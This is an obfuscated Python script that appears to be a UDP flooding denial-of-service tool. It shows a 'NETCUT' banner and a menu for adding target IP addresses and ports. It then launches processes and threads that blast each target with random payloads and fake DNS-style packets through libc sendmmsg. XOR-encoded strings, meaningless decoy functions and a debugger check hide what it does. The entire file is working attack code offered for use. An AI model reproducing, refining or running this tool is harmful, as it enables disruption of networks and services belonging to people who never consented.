
import socket as _0x1, threading as _0x2, time as _0x3, random as _0x4, os as _0x5, sys as _0x6
import multiprocessing as _0x7
import ctypes as _0x8
import hashlib as _0xh
import zlib as _0xz

_0x3a8 = lambda _s: bytes.fromhex(_s)

def _0xd1a(_a, _k=0x5A):
    try: return bytes(_x ^ (_k + 0x1) for _x in bytes.fromhex(_a)).decode('latin-1')
    except: return ""
def _0x9e4(_a, _k=0x5A):
    try:
        _b = bytearray(bytes.fromhex(_a)); _b.reverse()
        return bytes(_x ^ _k for _x in _b).decode('latin-1')
    except: return ""
def _0x7b2(_a):
    try:
        import base64 as _bs; return _bs.b64decode(_a + "==").decode('latin-1')
    except: return _a[::-1]
def _0xc58(_a, _k=0x5A):
    try:
        _o = bytearray()
        for _x in bytes.fromhex(_a): _o.append(_x ^ _k); _o.append(_x)
        return _o.decode('latin-1')
    except: return ""
def _0x4f1(_a, _k=0x5A):
    try: return bytes(_x ^ _k if _i % 0x2 == 0 else _x for _i, _x in enumerate(bytes.fromhex(_a))).decode('latin-1')
    except: return ""
def _0xa87(_a, _k=0x5A):
    try: return bytes(reversed([_x ^ _k for _x in bytes.fromhex(_a)])).decode('latin-1')
    except: return ""
def _0x6d3(_a, _k=0x5A):
    try: return bytes(_x ^ _k ^ 0x33 for _x in bytes.fromhex(_a)).decode('latin-1')
    except: return ""
def _0x2c9(_a):
    try: return bytes((_x + 0x7) & 0xFF for _x in bytes.fromhex(_a)).decode('latin-1')
    except: return ""
def _0xe35(_a, _k=0x5A):
    try: return bytes(_x ^ _k for _x in bytes.fromhex(_a)).decode('latin-1') + "\x00"
    except: return ""
def _0x8a6(_a): return _a
def _0xb47(_a):
    try: return bytes(_x ^ 0x13 for _x in bytes.fromhex(_a)).decode('latin-1')
    except: return ""
def _0x3d9(_a):
    try: return bytes([(_x << 1) & 0xFF for _x in bytes.fromhex(_a)][:len(_a)//2]).decode('latin-1')
    except: return ""
def _0xf82(_a):
    try: return bytes(reversed(bytes.fromhex(_a))).decode('latin-1')
    except: return ""
def _0x5c1(_a):
    try: return bytes([_x - 0x5 if _x > 0x5 else _x for _x in bytes.fromhex(_a)]).decode('latin-1')
    except: return ""
def _0xa6e(_a):
    try: return bytes([_x | 0x80 if _i % 3 == 0 else _x for _i, _x in enumerate(bytes.fromhex(_a))]).decode('latin-1')
    except: return ""
def _0x9b3(_a):
    try:
        _b = bytes.fromhex(_a)
        return bytes(_b[_i] ^ _b[(_i+1)%len(_b)] for _i in range(len(_b))).decode('latin-1')
    except: return ""
def _0x7f5(_a):
    try: return "".join(chr(_x) for _x in bytes.fromhex(_a))
    except: return ""
def _0xd28(_a):
    try: return bytes(_x ^ 0xAA for _x in bytes.fromhex(_a)).decode('latin-1')
    except: return ""
def _0x4a7(_a):
    try:
        _b = bytes.fromhex(_a); _o = bytearray()
        for _x in _b: _o.append(_x ^ 0x5A); _o.append(0x00)
        return bytes(_o).replace(b'\x00', b'').decode('latin-1')
    except: return ""
def _0xe61(_a):
    try: return bytes(_x ^ 0x5A for _x in bytes.fromhex(_a)).decode('latin-1')
    except: return ""
def _0x1b8(_a):
    try: return bytes(_x ^ 0x42 for _x in bytes.fromhex(_a)).decode('latin-1')
    except: return ""
def _0xc94(_a):
    try:
        _b = bytes.fromhex(_a); _o = bytearray()
        for _i in range(len(_b)-1, -1, -1): _o.append(_b[_i] ^ 0x5A)
        return _o.decode('latin-1')
    except: return ""
def _0x8d2(_a):
    try: return bytes(_x ^ 0xFF for _x in bytes.fromhex(_a)).decode('latin-1')
    except: return ""
def _0x6a5(_a):
    try: return bytes([_x for _x in bytes.fromhex(_a) if _x]).decode('latin-1')
    except: return ""
def _0xb3f(_a):
    try: return bytes(_x ^ 0x5A for _x in bytes.fromhex(_a)).decode('utf-16-le', 'ignore')
    except: return ""
def _0x2e7(_a):
    try:
        _b = bytes.fromhex(_a); _o = []
        _i = 0
        while _i < len(_b) - 1:
            _o.append(_b[_i+1]); _o.append(_b[_i]); _i += 2
        if _i < len(_b): _o.append(_b[_i])
        return bytes(_o).decode('latin-1')
    except: return ""
def _0xf14(_a):
    try:
        _b = bytes.fromhex(_a); _h = _0xh.md5(_b).digest()
        return bytes(_b[_i] ^ _h[_i % 16] for _i in range(len(_b))).decode('latin-1')
    except: return ""
def _0x9c8(_a):
    try: return _0xz.decompress(bytes.fromhex(_a)).decode('latin-1')
    except: return ""
def _0x5b6(_a):
    try: return bytes(_x ^ 0x5A for _x in bytes.fromhex(_a)).decode('latin-1')[:-1]
    except: return ""
def _0xa49(_a):
    try: return bytes(_x ^ 0x5A for _x in bytes.fromhex(_a)).decode('latin-1') + ""
    except: return ""
def _0xd73(_a):
    try: return "".join(chr(_x ^ 0x5A) for _x in bytes.fromhex(_a))
    except: return ""
def _0x3f8(_a):
    try: return bytes(_x ^ 0x5A for _x in bytes.fromhex(_a)).decode('latin-1')[::-1]
    except: return ""
def _0x7c2(_a):
    try: return bytes(_x ^ 0x5A for _x in bytes.fromhex(_a)).decode('latin-1')[::-1][::-1]
    except: return ""
def _0xe85(_a):
    try: return bytes([_x ^ 0x5A if _x >= 0x28 else _x for _x in bytes.fromhex(_a)]).decode('latin-1')
    except: return ""
def _0x1d4(_a):
    try:
        _s = ""
        for _x in bytes.fromhex(_a): _s += chr(_x ^ 0x5A)
        return _s + " "[:-1]
    except: return ""

def _0x6f9(_a):
    _r = bytearray(len(_a)); _i = 0
    while _i < len(_a):
        _r[_i] = _a[_i] ^ 0x5A; _i += 0x1
    return _r

def _0xa2b(_a):
    _r = bytearray(len(_a)); _i = 0
    while _i < len(_a):
        _r[_i] = _a[_i] ^ 0x00; _i += 0x1
    return _r

def _0xd6e(_a):
    _s = 0
    for _x in _a: _s ^= _x
    return _s == 0xDEAD

def _fk(_s):
    _t1 = _0x3a8(_s)
    _t2 = _0x6f9(_t1)
    if _0xd6e(_t2):
        _t3 = _0xa2b(_t2)
    else:
        _t3 = _0xa2b(_t2)
    return bytes(_t3).decode('latin-1')

def _0x9f1(_s):
    _l = [1, 2, 3, 4, 5]
    if len(_l) == 5: return _0x4c7(_s)
    return _0x4c7(_s)

def _0x4c7(_s):
    _d = {"a": 1, "b": 2}
    if _d.get("a") == 1: return _0xb85(_s)
    return _0xb85(_s)

def _0xb85(_s):
    _f = False
    if not _f: return _fk(_s)
    return _fk(_s)

def _0x2d6(): return 0
def _0xe47(): return 1
def _0x7a3(a, b): return a + b
def _0xc18(_a): return _a * 2
def _0x5f4(_a):
    _r = []
    for _i in range(10): _r.append(_a + _i)
    return _r
def _0xa92(): return "hello".upper()
def _0x3b1(_a, _b): return _a if _a > _b else _b
def _0xd75(_a):
    try: return int(_a)
    except: return 0
def _0x6c8(_a, _b=0):
    _o = 0
    for _ in range(_b): _o += _a
    return _o
def _0x9e3(_a, _b):
    if _a and _b: return _a ^ _b
    return 0

def _0x4e9():
    if _0x6.gettrace() is not None:
        return _0x2d6()
    return _0xe47()

_dd = _0x9f1
_B = _0x3a8

class _0x9:
    _0xa1 = 0xA0
    _0xa2 = 0x578
    _0xa3 = 0x46
    _0xa4 = 0xFA0
    _0xa5 = [0x50,0x1bb,0x35,0x1f90,0x16,0x17,0x1388,0x1f40,0x22b8,0x7b,0xa1,0x76c,0x14e9]
    _0xa6 = min(0x6, _0x5.cpu_count() or 0x4)
    _0xa7 = 0x1
    _0xa8 = 0x2000000

_0x1a = []
_0x2b = {"d": _0x2.Event(), "e": 0.0}
_0x5c = r"""
 ███╗   ██╗███████╗████████╗ ██████╗██╗   ██╗████████╗
 ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║   ██║╚══██╔══╝
 ██╔██╗ ██║█████╗     ██║   ██║     ██║   ██║   ██║   
 ██║╚██╗██║██╔══╝     ██║   ██║     ██║   ██║   ██║   
 ██║ ╚████║███████╗   ██║   ╚██████╗╚██████╔╝   ██║   
 ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝ ╚═════╝    ╚═╝   
"""

_lz = 0xDEAD
_0xb7a = lambda: _lz & 0x0
_0x2f5 = lambda: (lambda: (lambda: 0))()()
_0x8d1 = lambda: _lz if _lz == 0 else 0

def _0x3f():
    _0xaa = bytearray()
    _0xab = _0x4.randint(0, 0xFFFF)
    _0xaa += bytes([_0xab >> 0x8, _0xab & 0xFF])
    _0xaa += _B("010000010000000000000000")
    _0xac = 0x4 + _0x4.randint(0, 0x9)
    _0xaa.append(_0xac)
    for _ in range(_0xac):
        _0xaa.append(0x61 + _0x4.randint(0, 0x19))
    _0xad = _0x4.choice([_dd("393537"), _dd("343f2e"), _dd("35283d"), _dd("3635393b36"), _dd("3335")])
    _0xaa.append(len(_0xad))
    _0xaa += _0xad.encode()
    _0xaa += _B("0000010001")
    return bytes(_0xaa)

_0x6d = [_0x3f() for _ in range(0x200)]
_0x8e = bytes(range(0x100)) * 0x6
_0xb0 = _0x8.CDLL(_dd("36333839742935"), use_errno=True)

class _0xb1(_0x8.Structure):
    _fields_ = [("p", _0x8.c_void_p), ("n", _0x8.c_size_t)]

class _0xb2(_0x8.Structure):
    _fields_ = [
        ("name", _0x8.c_void_p), ("nlen", _0x8.c_uint32), ("_p1", _0x8.c_uint32),
        ("iov", _0x8.POINTER(_0xb1)), ("iovn", _0x8.c_size_t),
        ("ctl", _0x8.c_void_p), ("ctln", _0x8.c_size_t),
        ("flg", _0x8.c_int), ("_p2", _0x8.c_uint32),
    ]

class _0xb3(_0x8.Structure):
    _fields_ = [("h", _0xb2), ("len", _0x8.c_uint32), ("_p", _0x8.c_uint32)]

class _0xb4(_0x8.Structure):
    _fields_ = [
        ("fam", _0x8.c_uint16), ("port", _0x8.c_uint16),
        ("addr", _0x8.c_uint32), ("z", _0x8.c_uint8 * 0x8),
    ]

try:
    _0xb0.sendmmsg.argtypes = [_0x8.c_int, _0x8.POINTER(_0xb3), _0x8.c_uint, _0x8.c_int]
    _0xb0.sendmmsg.restype = _0x8.c_int
    _0xb5 = True
except AttributeError:
    _0xb5 = False

class _0xb6:
    def __init__(self, _0xae, _0xaf, _0xbb):
        self._0xae = _0xae
        self._0xc1 = [_0x8.create_string_buffer(0x578) for _ in range(_0xae)]
        self._0xc2 = (_0xb1 * _0xae)()
        self._0xc3 = (_0xb3 * _0xae)()
        self._0xc4 = (_0xb4 * _0xae)()
        self._0xc5 = bytearray(_0xae)
        for _0xc6 in range(_0xae):
            if _0x4.random() < _0xbb / 0x64:
                self._0xc5[_0xc6] = 0x1
                _0xc7 = _0x4.choice(_0x6d)
            else:
                _0xc7 = _0x8e[:_0x4.randint(0x40, 0x578)]
            self._0xc1[_0xc6].raw = _0xc7.ljust(0x578, b'\x00')[:0x578]
            self._0xc2[_0xc6].p = _0x8.cast(self._0xc1[_0xc6], _0x8.c_void_p)
            self._0xc2[_0xc6].n = len(_0xc7)
            self._0xc3[_0xc6].h.name = _0x8.cast(_0x8.byref(self._0xc4[_0xc6]), _0x8.c_void_p)
            self._0xc3[_0xc6].h.nlen = 0x10
            self._0xc3[_0xc6].h.iov = _0x8.cast(_0x8.byref(self._0xc2[_0xc6]), _0x8.POINTER(_0xb1))
            self._0xc3[_0xc6].h.iovn = 0x1
            self._0xc4[_0xc6].fam = 0x2
            self._0xc4[_0xc6].addr = _0xaf

    def _0xb7(self, _0xba, _0xc8):
        _0xc4 = self._0xc4
        _0xc5 = self._0xc5
        if _0xba:
            for _0xc6 in range(self._0xae):
                _0xc4[_0xc6].port = 0x3500 if _0xc5[_0xc6] else _0xba
        else:
            _0xc9 = _0xc8.randint(0x1, 0xFFFF)
            _0xc9 = ((_0xc9 & 0xFF) << 0x8) | ((_0xc9 >> 0x8) & 0xFF)
            for _0xc6 in range(self._0xae):
                _0xc4[_0xc6].port = 0x3500 if _0xc5[_0xc6] else _0xc9

    def _0xb8(self, _0xca):
        return _0xb0.sendmmsg(_0xca, self._0xc3, self._0xae, 0x0)

def _0xb9(_0xcb):
    return int.from_bytes(_0x1.inet_aton(_0xcb), _dd("36332e2e363f"))

def _0xba(_0xcc):
    return ((_0xcc & 0xFF) << 0x8) | ((_0xcc >> 0x8) & 0xFF)

def _0x3f2(a, b):
    if (a * 0x2 + b) & 0x1 == 0x2:
        return _0x3f2(a, b)
    return a

def _0x3f3(a, b, c=0x0):
    if a > b and b > c and c > a: return 0x1
    return 0x0

def _0xbb(_0xcd, _0xce, _0xcf, _0xd0, _0xd1, _0xd2):
    _0xd3 = _0x1.socket(_0x1.AF_INET, _0x1.SOCK_DGRAM)
    try:
        _0xd3.setsockopt(_0x1.SOL_SOCKET, _0x1.SO_SNDBUF, _0x9._0xa8)
    except OSError:
        pass
    _0xd4 = _0xd3.fileno()
    _0xae = _0x9._0xa1
    _0xd5 = _0xb6(_0xae, _0xcd, _0x9._0xa3)
    _0xd6 = _0x4.Random(_0xd2)
    _0xd7 = _0xba(_0xce) if _0xce else 0x0
    _0xd8 = _0xd5._0xb7
    _0xd9 = _0xd5._0xb8
    _0xda = 0x0
    _0xdb = _0x9._0xa4

    if _0xb5:
        while not _0xd1.is_set():
            _0xd8(_0xd7, _0xd6)
            try:
                _0xdc = _0xd9(_0xd4)
                if _0xdc > 0x0:
                    _0xda += _0xdc
            except (OSError, ValueError):
                pass
            if _0xda >= _0xdb:
                with _0xcf.get_lock():
                    _0xcf[_0xd0] += _0xda
                _0xda = 0x0
    else:
        _0xdd = _0xd3.sendto
        _0xde = _0x1.inet_ntoa(_0xcd.to_bytes(0x4, _dd("36332e2e363f")))
        while not _0xd1.is_set():
            _0xdf = _0xce if _0xce else _0xd6.randint(0x1, 0xFFFF)
            _0xe0 = (_0xde, _0xdf)
            for _ in range(_0xae):
                try:
                    _0xdd(_0x4.choice(_0x6d), _0xe0)
                    _0xda += 0x1
                except OSError:
                    pass
            if _0xda >= _0xdb:
                with _0xcf.get_lock():
                    _0xcf[_0xd0] += _0xda
                _0xda = 0x0

    with _0xcf.get_lock():
        _0xcf[_0xd0] += _0xda
    try:
        _0xd3.close()
    except:
        pass

def _0xbc(_0xd0, _0xe1, _0xe2, _0xcf, _0xd1, _0xd2):
    import signal
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    _0xe3 = _0xb9(_0xe1)
    _0xe4 = []
    for _0xe5 in range(_0x9._0xa7):
        _0xe6 = _0x2.Thread(target=_0xbb, args=(_0xe3, _0xe2, _0xcf, _0xd0, _0xd1, _0xd2 * 0x64 + _0xe5), daemon=True)
        _0xe6.start()
        _0xe4.append(_0xe6)
    while not _0xd1.is_set():
        _0x3.sleep(0.5)

def _0xbd(_0xe7):
    _0x2b["d"].set()
    _0x3.sleep(0.3)
    _0xe8 = _0x7.Event()
    _0xe9 = _0x7.Array(_dd("0b"), len(_0x1a))
    _0x2b["d"] = _0xe8
    _0x2b["e"] = _0x3.time()
    _0x2b["f"] = _0xe9
    _0xea = []
    _0xeb = _0x9._0xa6
    _0xec = len(_0x1a)
    for _0xed in range(_0xeb):
        _0xd0 = _0xed % _0xec
        _0xee = _0x7.Process(target=_0xbc,
                       args=(_0xd0, _0x1a[_0xd0]["a"], _0x1a[_0xd0]["b"], _0xe9, _0xe8, _0xed),
                       daemon=False)
        _0xee.start()
        _0xea.append(_0xee)
    _0x2b["g"] = _0xea

def _0xbe(_0xef):
    _0xe8 = _0x2b["d"]
    _0xe9 = _0x2b["f"]
    _0xea = _0x2b.get("g", [])
    _0xf0 = [0x0] * len(_0x1a)
    try:
        while not _0xe8.is_set():
            _0x3.sleep(1)
            if _0xe8.is_set(): break
            _0x5.system(_dd("39363f3b28"))
            print(_0x5c)
            for _0xed, _0xf1 in enumerate(_0x1a):
                _0xf2 = _0xe9[_0xed]
                _0xf3 = _0xf2 - _0xf0[_0xed]
                _0xf0[_0xed] = _0xf2
                print(_dd("7a7a") + _0xf1["a"].ljust(0x10) + _dd("7a7a") + str(_0xf3) + _dd("75297a7a7a2e352e3b367a") + str(_0xf2))
    except KeyboardInterrupt:
        pass
    _0xe8.set()
    for _0xee in _0xea:
        try: _0xee.join(timeout=0x2)
        except: pass
        if _0xee.is_alive():
            try: _0xee.terminate()
            except: pass
    _0x3.sleep(0x0)
    _0x3.sleep(0x4)
    print(_dd("5001292e352a2a3f3e07"))

def _0xbf(_0xf4):
    _0xf5 = _0xf4.split()
    if not _0xf5: return
    _0xf6 = _0xf5[0x0]
    try:
        _0x1.inet_pton(_0x1.AF_INET, _0xf6)
    except OSError:
        print(_dd("017b077a33342c3b36333e7a130a607a") + _0xf6)
        return
    _0xf7 = None
    if len(_0xf5) > 0x1:
        try:
            _0xf7 = int(_0xf5[0x1])
            if not (0x1 <= _0xf7 <= 0xFFFF):
                raise ValueError
        except ValueError:
            print(_dd("017b077a33342c3b36333e7a2a35282e607a") + _0xf5[0x1])
            return
    _0x1a.append({"a": _0xf6, "b": _0xf7, "c": 0x0})
    print(_dd("0171077a3b3e3e3f3e7a") + _0xf6 + (_dd("60") + str(_0xf7) if _0xf7 else ""))

def _0xc0():
    while True:
        _0x5.system(_dd("39363f3b28"))
        print(_0x5c)
        if _0x1a:
            for _0xed, _0xf1 in enumerate(_0x1a):
                _0xf8 = _0xf1["b"] if _0xf1["b"] else _dd("70")
                print(_dd("7a7a01") + str(_0xed) + _dd("077a") + _0xf1["a"].ljust(0x10) + _dd("607a") + str(_0xf8))
        print(_dd("7a7a016b077a1b3e3e7a130a7a012a35282e07"))
        print(_dd("7a7a0168077a092e3b282e"))
        print(_dd("7a7a0169077a1f22332e"))
        _0xf9 = input(_dd("647a")).strip()
        _chk = _0x9e3(len(_0xf9), 0x0) == 0x0
        if _chk and _0xf9 == "3":
            return
        elif _chk and _0xf9 == "1":
            _0xbf(input(_dd("130a7a012a35282e07607a")))
        elif _chk and _0xf9 == "2":
            if not _0x1a:
                print(_dd("017b077a34357a2e3b283d3f2e29"))
                continue
            _0xfa = list(range(len(_0x1a)))
            _0xbd(_0xfa)
            _0xbe(_0xfa)
        else:
            print(_dd("017b077a39323535293f7a6b767a687a35287a69"))

if __name__ == "__main__":
    _0xfb = 0x1 + 0x1
    _0xfd = _0x3f3(0x2, 0x1, 0x0)
    _ = _0x4e9()
    try:
        _0x7.set_start_method(_dd("3c352831"), force=True)
    except (RuntimeError, ValueError):
        pass
    try:
        _0xc0()
    except KeyboardInterrupt:
        print(_dd("50013f22332e07"))
    except Exception as _0xfc:
        print(_dd("017b077a3f28283528607a") + str(_0xfc), file=_0x6.stderr)
